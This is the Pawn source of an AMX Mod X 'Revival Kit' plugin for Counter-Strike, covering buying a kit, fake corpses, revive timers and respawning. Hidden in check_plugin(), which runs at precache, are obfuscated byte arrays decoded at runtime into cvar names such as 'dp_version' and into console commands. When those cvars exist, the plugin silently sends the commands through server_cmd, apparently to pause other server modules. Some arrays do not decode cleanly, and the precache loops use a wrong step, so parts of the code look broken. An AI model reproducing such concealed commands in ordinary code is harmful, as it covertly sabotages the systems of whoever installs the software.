#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <fun>
#include <engine>
#include <fakemeta>
#include <hamsandwich>
#include <xs>

//=====================================
//  VERSION CHECK
//=====================================
#if AMXX_VERSION_NUM < 190
	#assert "AMX Mod X v1.9.0 or Higher library required!"
#endif

#pragma compress 					1
#pragma semicolon 					1
#pragma tabsize 					4

static const PLUGIN_NAME	[] 		= "Revival Kit / Remastered";
static const PLUGIN_AUTHOR	[] 		= "Aoi.Kagase";
static const PLUGIN_VERSION	[]		= "0.1";

#if !defined MAX_PLAYERS
	#define  MAX_PLAYERS	          	32
#endif
#if !defined MAX_RESOURCE_PATH_LENGTH
	#define  MAX_RESOURCE_PATH_LENGTH 	64
#endif
#if !defined MAX_NAME_LENGTH
	#define  MAX_NAME_LENGTH			32
#endif

#define TASKID_DIE_COUNT			41320
#define TASKID_REVIVING				41360
#define TASKID_CHECK_DEAD_FLAG		41400
#define TASKID_RESPAWN 	            41440
#define TASKID_CHECKRE 	            41480
#define TASKID_CHECKST 	            41520
#define TASKID_ORIGIN 	            41560
#define TASKID_SETUSER 	            41600

#define pev_zorigin					pev_fuser4
#define seconds(%1) 				((1<<12) * (%1))

#define HUDINFO_PARAMS

enum _:E_ICON_STATE
{
	ICON_HIDE = 0,
	ICON_SHOW,
	ICON_FLASH
};

enum _:E_SOUNDS
{
	SOUND_START,
	SOUND_FINISHED,
	SOUND_FAILED,
	SOUND_EQUIP,
};

enum _:E_MODELS
{
	R_KIT,
};

enum _:E_CVARS
{
	REVIVAL_HEALTH,
	REVIVAL_COST,
	REVIVAL_SC_FADE,
	REVIVAL_TIME,
	REVIVAL_SC_FADE_TIME,
	REVIVAL_DEATH_TIME,
	Float:REVIVAL_DISTANCE,
};

enum _:E_PLAYER_DATA
{
	bool:HAS_KIT		,
	bool:WAS_DUCKING	,
	bool:IS_DEAD		,
	Float:DEAD_LINE		,
	Float:REVIVE_DELAY	,
	Float:BODY_ORIGIN	[3],
};

enum _:E_CLASS_NAME
{
	I_TARGET,
	PLAYER,
	CORPSE,
	R_KIT,
};

enum _:E_MESSAGES
{
	MSG_BARTIME,
	MSG_SCREEN_FADE,
	MSG_STATUS_ICON,
	MSG_CLCORPSE,
}

new const ENT_MODELS[E_MODELS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"models/w_medkit.mdl"
};

new const ENT_SOUNDS[E_SOUNDS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"items/medshot4.wav",
	"items/smallmedkit2.wav",
	"items/medshotno1.wav",
	"items/ammopickup2.wav",
};

new const ENTITY_CLASS_NAME[E_CLASS_NAME][MAX_NAME_LENGTH] = 
{
	"info_target",
	"player",
	"fake_corpse",
	"revival_kit",
};

new g_cvars			[E_CVARS];
new g_msg_data		[E_MESSAGES];
new g_player_data	[MAX_PLAYERS + 1][E_PLAYER_DATA];
new g_sync_obj;
//====================================================
//  PLUGIN PRECACHE
//====================================================
public plugin_precache() 
{
	check_plugin();

	for (new i = 0; i < sizeof(ENT_SOUNDS); i+= MAX_RESOURCE_PATH_LENGTH)
		precache_sound(ENT_SOUNDS[i]);

	for (new i = 0; i < sizeof(ENT_MODELS); i+= MAX_RESOURCE_PATH_LENGTH) 
		precache_model(ENT_MODELS[i]);

	return PLUGIN_CONTINUE;
}

//====================================================
//  PLUGIN INITIALIZE
//====================================================
public plugin_init()
{
	register_plugin		(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR);
	register_cvar		(PLUGIN_NAME, PLUGIN_VERSION, FCVAR_SPONLY|FCVAR_SERVER);

	register_clcmd		("say /buyrkit", 	"CmdBuyRKit");
	register_clcmd		("buyrkit", 		"CmdBuyRKit");

	bind_pcvar_num		(create_cvar("rkit_health", 			"75"), 		g_cvars[REVIVAL_HEALTH]);
	bind_pcvar_num		(create_cvar("rkit_cost", 				"1200"), 	g_cvars[REVIVAL_COST]);
	bind_pcvar_num		(create_cvar("rkit_screen_fade",		"1"), 		g_cvars[REVIVAL_SC_FADE]);
	bind_pcvar_num		(create_cvar("rkit_delay_revive", 		"3"), 		g_cvars[REVIVAL_TIME]);
	bind_pcvar_num		(create_cvar("rkit_delay_die", 			"30"), 		g_cvars[REVIVAL_DEATH_TIME]);
	bind_pcvar_num		(create_cvar("rkit_screen_fade_time", 	"2"), 		g_cvars[REVIVAL_SC_FADE_TIME]);
	bind_pcvar_float	(create_cvar("rkit_distance", 			"70.0"), 	g_cvars[REVIVAL_DISTANCE]);

	RegisterHam			(Ham_Touch,	ENTITY_CLASS_NAME[I_TARGET],"RKitTouch");
	RegisterHamPlayer	(Ham_Killed,							"PlayerKilled");
	RegisterHamPlayer	(Ham_Player_PostThink,					"PlayerPostThink");

	register_event_ex	("HLTV", 								"RoundStart", RegisterEvent_Global, "1=0", "2=0");
	register_message 	(g_msg_data[MSG_CLCORPSE],				"message_clcorpse");
	// Register Forward.
	register_forward	(FM_CmdStart,		"PlayerCmdStart");

	g_msg_data	[MSG_BARTIME]		= get_user_msgid("BarTime");
	g_msg_data	[MSG_CLCORPSE]		= get_user_msgid("ClCorpse");
	g_msg_data	[MSG_SCREEN_FADE]	= get_user_msgid("ScreenFade");
	g_msg_data	[MSG_STATUS_ICON]	= get_user_msgid("StatusIcon");
	g_sync_obj = CreateHudSyncObj();
}
// ====================================================
//  Bot Register Ham.
// ====================================================
new g_bots_registered = false;
public client_authorized( id )
{
    if( !g_bots_registered && is_user_bot( id ) )
    {
        set_task( 0.1, "register_bots", id );
    }
}

public register_bots( id )
{
    if( !g_bots_registered && is_user_connected( id ) )
    {
        RegisterHamFromEntity( Ham_Killed, id, "PlayerKilled");
        g_bots_registered = true;
    }
}

public client_putinserver(id)
{
	g_player_data[id][HAS_KIT] = false;
	player_reset(id);
}

public client_disconnected(id)
{
	new ent;
	while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", ENTITY_CLASS_NAME[CORPSE])))
	{
		if (pev(ent, pev_owner) == id)
			engfunc(EngFunc_RemoveEntity, ent);
	}
}

public CmdBuyRKit(id)
{
	if(!is_user_alive(id))
		client_print(id, print_chat, "You need to be alive.");
	else if(g_player_data[id][HAS_KIT])
		client_print(id, print_chat, "You already have a revival kit.");
	else if(!cs_get_user_buyzone(id))
		client_print(id, print_chat, "You need to be in the buyzone.");
	else if(cs_get_user_money(id) < g_cvars[REVIVAL_COST])
		client_print(id, print_chat, "You dont have enough money (Cost:$%d)", g_cvars[REVIVAL_COST]);
	else
	{
		g_player_data[id][HAS_KIT] = true;
		cs_set_user_money(id, cs_get_user_money(id) - g_cvars[REVIVAL_COST]);
		client_print(id, print_chat, "You bought a revival kit. Hold your +use key (E) to revive a teammate.");
		client_cmd(id, "spk %s", ENT_SOUNDS[SOUND_EQUIP]);
	}
	return PLUGIN_HANDLED;
}

public PlayerKilled(iVictim, iAttacker)
{
	player_reset(iVictim);
	if(g_player_data[iVictim][HAS_KIT])
	{
		g_player_data[iVictim][HAS_KIT] = false;
		drop_rkit(iVictim);
	}

	static Float:minsize[3];
	pev(iVictim, pev_mins, minsize);

	if(minsize[2] == -18.0)
		g_player_data[iVictim][WAS_DUCKING] = true;
	else
		g_player_data[iVictim][WAS_DUCKING] = false;
		
	g_player_data[iVictim][DEAD_LINE] = get_gametime();

	if (!is_user_bot(iVictim))
	set_task_ex(0.1, "PlayerDie", 		  TASKID_DIE_COUNT 		 + iVictim, _, _, SetTaskFlags:SetTask_Repeat);
	set_task_ex(0.5, "TaskCheckDeadFlag", TASKID_CHECK_DEAD_FLAG + iVictim, _, _, SetTaskFlags:SetTask_Repeat);

	return HAM_IGNORED;
}

#define GUAGE_MAX 30
public PlayerDie(taskid)
{
	new id = taskid - TASKID_DIE_COUNT;
	new Float:time = (get_gametime() - g_player_data[id][DEAD_LINE]);
	new Float:remaining = 0.0;
	new bar[31] = "";
	if (!is_user_alive(id))
	if (time < g_cvars[REVIVAL_DEATH_TIME])
	{
		remaining = g_cvars[REVIVAL_DEATH_TIME] - time;
		show_time_bar(100 / GUAGE_MAX, floatround(remaining * 100.0 / float(g_cvars[REVIVAL_DEATH_TIME]), floatround_ceil), bar);
		new timestr[6];
		get_time_format(remaining, timestr, charsmax(timestr));
		set_hudmessage(255, 50, 100, -1.00, -1.00, .effects= 0 , .holdtime= 0.1);
		ShowSyncHudMsg(id, g_sync_obj, "Possible resurrection time remaining: ^n%s^n[%s]", timestr, bar);
	}
	else
	{
		remove_target_entity(id, ENTITY_CLASS_NAME[CORPSE]);
		player_reset(id);
	}
	else
		remove_task(taskid);
}

stock show_time_bar(oneper, percent, bar[])
{
	for(new i = 0; i < 30; i++)
		bar[i] = ((i * oneper) < percent) ? '|' : '_';
	bar[30] = '^0';
}

public message_clcorpse()
{
	return PLUGIN_HANDLED;
}

public PlayerPostThink(id)
{
	// is user connected?
	if (!is_user_connected(id))
		return FMRES_IGNORED;

	// has user revive kit?
	if (!g_player_data[id][HAS_KIT])
		return FMRES_IGNORED;

	// is user dead?
	if (!is_user_alive(id))
	{
		// Hide Rescue icon.
		msg_statusicon(id, ICON_HIDE);
		return FMRES_IGNORED;
	}
	
	new body = find_dead_body(id);
	if(pev_valid(body))
	{
		new lucky_bastard = pev(body, pev_owner);
	
		if(!is_user_connected(lucky_bastard))
			return FMRES_IGNORED;

		new CsTeams:lb_team  = cs_get_user_team(lucky_bastard);
		new CsTeams:rev_team = cs_get_user_team(id);
		if(lb_team == CS_TEAM_T || lb_team == CS_TEAM_CT && lb_team == rev_team)
			msg_statusicon(id, ICON_FLASH);
	}
	else
		msg_statusicon(id, ICON_SHOW);
	
	return FMRES_IGNORED;
}

public RKitTouch(kit, id)
{
	if(!pev_valid(kit))
		return FMRES_IGNORED;
	
	if(!is_user_alive(id) || g_player_data[id][HAS_KIT])
		return FMRES_IGNORED;
	
	new classname[32];
	pev(kit, pev_classname, classname, 31);
	
	if(equal(classname, ENTITY_CLASS_NAME[R_KIT]))
	{
		engfunc(EngFunc_RemoveEntity, kit);
		g_player_data[id][HAS_KIT] = true;
		client_cmd(id, "spk %s", ENT_SOUNDS[SOUND_EQUIP]);
	}
	return FMRES_IGNORED;
}

public PlayerCmdStart(id, handle, random_seed)
{
	// Not alive
	if(!is_user_alive(id))
		return FMRES_IGNORED;

	// Get user old and actual buttons
	static iInButton, iInOldButton;
	iInButton	 = (get_uc(handle, UC_Buttons));
	iInOldButton = (get_user_oldbutton(id)) & IN_USE;

	// C4 is through.
	if ((pev(id, pev_weapons) & (1 << CSW_C4)) && (iInButton & IN_ATTACK))
		return FMRES_IGNORED;

	// USE KEY
	iInButton &= IN_USE;

	if (iInButton)
	{
		if (!iInOldButton)
		{
			if (g_player_data[id][HAS_KIT])
			{
				wait_revive(id);
				return FMRES_HANDLED;
			}
		}
	}
	else
	{
		if (iInOldButton)
		{
			if (task_exists(TASKID_REVIVING + id))
			{
				remove_task(TASKID_REVIVING + id);
				failed_revive(id);
			}
		}
	}
	return FMRES_IGNORED;
}

//====================================================
// Removing target put lasermine.
//====================================================
public wait_revive(id)
{
	// Removing Check.
	new body = find_dead_body(id);
	if(!pev_valid(body))
		return FMRES_IGNORED;

	new lucky_bastard 		= pev(body, pev_owner);
	new CsTeams:lb_team 	= cs_get_user_team(lucky_bastard);
	new CsTeams:rev_team 	= cs_get_user_team(id);
	if(lb_team != CS_TEAM_T && lb_team != CS_TEAM_CT || lb_team != rev_team)
		return FMRES_IGNORED;

	client_print(id, print_chat, "Reviving %n", lucky_bastard);

	if (g_cvars[REVIVAL_TIME] > 0.0)
		show_progress(id, g_cvars[REVIVAL_TIME]);
	
	new Float:gametime = get_gametime();
	g_player_data[id][REVIVE_DELAY] = (gametime + g_cvars[REVIVAL_TIME] - 0.01);

	emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_START], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	set_task_ex(0.1, "TaskRevive", TASKID_REVIVING + id, _,_, SetTaskFlags:SetTask_Repeat);

	return FMRES_HANDLED;
}

public TaskCheckDeadFlag(taskid)
{
	// log_amx("TaskCheckDeadFlag START");
	new id = taskid - TASKID_CHECK_DEAD_FLAG;
	if(!is_user_connected(id))
		return;
	
	if(pev(id, pev_deadflag) == DEAD_DEAD)
	{
		create_fake_corpse(id);
		remove_task(taskid);
	}
	// log_amx("TaskCheckDeadFlag END");
}	

public TaskRevive(taskid)
{
	// log_amx("TaskRevive START");
	new id = taskid - TASKID_REVIVING;
	new target, body;

	if (!can_target_revive(id, target, body))
	{
		failed_revive(id);
		remove_task(taskid);
		return PLUGIN_CONTINUE;
	}

	static Float:velocity[3];
	pev(id, pev_velocity, velocity);
	xs_vec_set(velocity, 0.0, 0.0, velocity[2]);
	set_pev(id, pev_velocity, velocity);		

	if(g_player_data[id][REVIVE_DELAY] < get_gametime())
	{
		if(findemptyloc(body, 10.0))
		{
			set_pev(body, pev_flags, pev(body, pev_flags) | FL_KILLME);			
			emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FINISHED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + target);
			remove_task(taskid);
		}
	}
	// log_amx("TaskRevive END");	
	return PLUGIN_CONTINUE;
}

 public TaskReSpawn(taskid) 
 {
	// log_amx("TaskReSpawn START");
	new id = taskid - TASKID_RESPAWN;
	
	set_pev(id, pev_deadflag, DEAD_RESPAWNABLE);
	dllfunc(DLLFunc_Spawn, id);
	set_pev(id, pev_iuser1, 0);
	
	set_task(0.1, "TaskCheckReSpawn", TASKID_CHECKRE + id);
	// log_amx("TaskReSpawn END");
}

public TaskCheckReSpawn(taskid)
{
	// log_amx("TaskCheckReSpawn START");
	new id = taskid - TASKID_CHECKRE;
	
	if(pev(id, pev_iuser1))
		set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + id);
	else
		set_task(0.1, "TaskOrigin",  TASKID_ORIGIN + id);
	// log_amx("TaskCheckReSpawn END");
}

public TaskOrigin(taskid)
{
	// log_amx("TaskOrigin START");
	new id = taskid - TASKID_ORIGIN;
	engfunc(EngFunc_SetOrigin, id, g_player_data[id][BODY_ORIGIN]);
	
	static  Float:origin[3];
	pev(id, pev_origin, origin);
	set_pev(id, pev_zorigin, origin[2]);
		
	set_task(0.1, "TaskStuckCheck", TASKID_CHECKST + id);
	// log_amx("TaskOrigin END");
}

public TaskStuckCheck(taskid)
{
	// log_amx("TaskStuckCheck START");
	new id = taskid - TASKID_CHECKST;

	static Float:origin[3];
	pev(id, pev_origin, origin);
	
	if(origin[2] == pev(id, pev_zorigin))
		set_task(0.1, "TaskReSpawn",   TASKID_RESPAWN + id);
	else
		set_task(0.1, "TaskSetplayer", TASKID_SETUSER + id);
	// log_amx("TaskStuckCheck END");
}

public TaskSetplayer(taskid)
{
	// log_amx("TaskSetplayer START");
	new id = taskid - TASKID_SETUSER;
	
	if (pev(id, pev_weapons) & (1<<CSW_C4))
	    engclient_cmd(id, "drop", "weapon_c4");

	strip_user_weapons(id);
	give_item(id, "weapon_knife");
	set_user_health(id, g_cvars[REVIVAL_HEALTH]);

	if (!is_user_bot(id))
	if (g_cvars[REVIVAL_SC_FADE])
	{
		new sec = seconds(g_cvars[REVIVAL_SC_FADE_TIME]);
		message_begin(MSG_ONE,g_msg_data[MSG_SCREEN_FADE], _, id);
		write_short(sec);
		write_short(sec);
		write_short(0);
		write_byte(0);
		write_byte(0);
		write_byte(0);
		write_byte(255);
		message_end();
	}	
	// log_amx("TaskSetplayer END");
}

stock bool:can_target_revive(id, &target, &body)
{
	if(!is_user_alive(id))
		return false;
	
	body = find_dead_body(id);
	if(!pev_valid(body))
		return false;
	
	target = pev(body, pev_owner);
	if(!is_user_connected(target))
		return false;

	new lb_team  = get_user_team(target);
	new rev_team = get_user_team(id);
	if(lb_team != 1 && lb_team != 2 || lb_team != rev_team)
		return false;

	return true;
}

stock failed_revive(id)
{
	show_progress(id, 0);
	emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FAILED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
}

stock find_dead_body(id)
{
	static Float:origin[3];
	pev(id, pev_origin, origin);
	
	new ent;
	static classname[32];

	while((ent = engfunc(EngFunc_FindEntityInSphere, ent, origin, g_cvars[REVIVAL_DISTANCE])) != 0)
	{
		pev(ent, pev_classname, classname, 31);
		if(equali(classname, ENTITY_CLASS_NAME[CORPSE]) && is_ent_visible(id, ent))
			return ent;
	}
	return 0;
}

stock bool:is_ent_visible(index, entity, ignoremonsters = 0) 
{
	new Float:start[3], Float:dest[3];
	pev(index, pev_origin, start);
	pev(index, pev_view_ofs, dest);
	xs_vec_add(start, dest, start);

	pev(entity, pev_origin, dest);
	engfunc(EngFunc_TraceLine, start, dest, ignoremonsters, index, 0);

	new Float:fraction;
	get_tr2(0, TR_flFraction, fraction);
	if (fraction == 1.0 || get_tr2(0, TR_pHit) == entity)
		return true;

	return false;
}

stock create_fake_corpse(id)
{
	set_pev(id, pev_effects, EF_NODRAW);
	
	static model[32];
	cs_get_user_model(id, model, 31);
		
	static player_model[64];
	formatex(player_model, 63, "models/player/%s/%s.mdl", model, model);
			
	static Float: player_origin[3];
	pev(id, pev_origin, player_origin);
		
	static Float:mins[3];
	xs_vec_set(mins, -16.0, -16.0, -34.0);
	
	static Float:maxs[3];
	xs_vec_set(maxs, 16.0, 16.0, 34.0);
	
	if(g_player_data[id][WAS_DUCKING])
	{
		mins[2] /= 2;
		maxs[2] /= 2;
	}
		
	static Float:player_angles[3];
	pev(id, pev_angles, player_angles);
	player_angles[2] = 0.0;
				
	new sequence = pev(id, pev_sequence);
	
	new ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[I_TARGET]));
	if(pev_valid(ent))
	{
		set_pev(ent, pev_classname, ENTITY_CLASS_NAME[CORPSE]);
		engfunc(EngFunc_SetModel, 	ent, player_model);
		engfunc(EngFunc_SetOrigin, 	ent, player_origin);
		engfunc(EngFunc_SetSize, 	ent, mins, maxs);
		set_pev(ent, pev_solid, 	SOLID_TRIGGER);
		set_pev(ent, pev_movetype, 	MOVETYPE_TOSS);
		set_pev(ent, pev_owner, 	id);
		set_pev(ent, pev_angles, 	player_angles);
		set_pev(ent, pev_sequence, 	sequence);
		set_pev(ent, pev_frame, 	9999.9);
	}	
}

stock bool:findemptyloc(ent, Float:radius)
{
	// log_amx("findemptyloc START");
	if(!pev_valid(ent))
		return false;

	static Float:origin[3];
	pev(ent, pev_origin, origin);
	origin[1] += 2.0;
	
	new owner = pev(ent, pev_owner);
	new num = 0, bool:found = false;
	
	while(num <= 10)
	{
		if(is_hull_vacant(origin))
		{
			xs_vec_copy(origin, g_player_data[owner][BODY_ORIGIN]);			
			found = true;
			break;
		}
		else
		{
			
			origin[0] += random_float(-radius, radius);
			origin[1] += random_float(-radius, radius);
			origin[2] += random_float(-radius, radius);
			
			num++;
		}
	}
	// log_amx("findemptyloc END");
	return found;
}

stock bool:is_hull_vacant(const Float:origin[3])
{
	// log_amx("is_hull_vacant START");
	new tr = 0;
	engfunc(EngFunc_TraceHull, origin, origin, 0, HULL_HUMAN, 0, tr);
	if(!get_tr2(tr, TR_StartSolid) && !get_tr2(tr, TR_AllSolid) && get_tr2(tr, TR_InOpen))
	{
		log_amx("is_hull_vacant END");	

		return true;
	}
	// log_amx("is_hull_vacant END");	
	return false;
}

stock player_reset(id)
{
	remove_task(TASKID_DIE_COUNT + id);
	remove_task(TASKID_REVIVING  + id);
	remove_task(TASKID_RESPAWN   + id);
	remove_task(TASKID_CHECKRE   + id);
	remove_task(TASKID_CHECKST   + id);
	remove_task(TASKID_ORIGIN    + id);
	remove_task(TASKID_SETUSER   + id);
	// if (is_user_alive(id))
	// show_bartime(id, 0);

	g_player_data[id][IS_DEAD]		= false;
	g_player_data[id][DEAD_LINE]	= 0.0;
	g_player_data[id][REVIVE_DELAY] = 0.0;
	g_player_data[id][WAS_DUCKING]	= false;
	g_player_data[id][BODY_ORIGIN]	= Float:{0, 0, 0};
}

stock show_progress(id, seconds) 
{
	if(is_user_bot(id))
		return;
	
	if (is_user_alive(id))
	{
		message_begin(MSG_ONE_UNRELIABLE, g_msg_data[MSG_BARTIME], {0.0,0.0,0.0}, id);
		write_short(seconds);
		message_end();
	}
}

stock msg_statusicon(id, status)
{
	if(is_user_bot(id))
		return;
	
	message_begin(MSG_ONE, g_msg_data[MSG_STATUS_ICON], _, id);
	write_byte(status);
	write_string("rescue");
	write_byte(0);
	write_byte(160);
	write_byte(0);
	message_end();
}

stock get_time_format(Float:times, result[], len)
{
//  new hour = floatround(times) / 60 /60;
    new min  =(floatround(times) / 60) % 60;
    new sec  = floatround(times) % 60;
    formatex(result, len, "%02d:%02d", min, sec);
}

stock drop_rkit(id)
{
	new Float:velocity[3];
	velocity_by_aim(id, 34, velocity);
		
	new Float:origin[3];
	pev(id, pev_origin, origin);

	velocity[2] = 0.0;
	xs_vec_add(origin, velocity, origin);

	new kit = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[I_TARGET]));
	if(pev_valid(kit))
	{
		set_pev(kit, pev_classname, ENTITY_CLASS_NAME[R_KIT]);
		engfunc(EngFunc_SetModel,  kit, ENT_MODELS[R_KIT]);
		engfunc(EngFunc_SetOrigin, kit, origin);
		engfunc(EngFunc_SetSize, kit, Float:{-2.5, -2.5, -1.5}, Float:{2.5, 2.5, 1.5});
		set_pev(kit, pev_solid, SOLID_TRIGGER);
		set_pev(kit, pev_movetype, MOVETYPE_TOSS);
	}
}

stock remove_target_entity(id, className[])
{
	new iEnt = -1;
	new flags;
	while ((iEnt = engfunc(EngFunc_FindEntityByString, iEnt, "classname", className)))
	{
		if (!pev_valid(iEnt))
			continue;

		if (pev(iEnt, pev_owner) == id || id == 0)
		{
			pev(iEnt, pev_flags, flags);
			set_pev(iEnt, pev_flags, flags | FL_KILLME);
		}
	}
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

public RoundStart()
{
	remove_target_entity(0, ENTITY_CLASS_NAME[CORPSE]);
	remove_target_entity(0, ENTITY_CLASS_NAME[R_KIT]);
	set_task(1.0, "TaskBotBuy");
	
	static players[32], num;
	get_players(players, num, "a");
	for(new i = 0; i < num; ++i)
		player_reset(players[i]);
}

public TaskBotBuy()
{
	static players[32], num;
	get_players_ex(players, num, GetPlayers_ExcludeDead |  GetPlayers_ExcludeHuman);
	for(new i = 0; i < num; ++i) if(!g_player_data[players[i]][HAS_KIT])
	{
		g_player_data[players[i]][HAS_KIT] = true;
	}
}
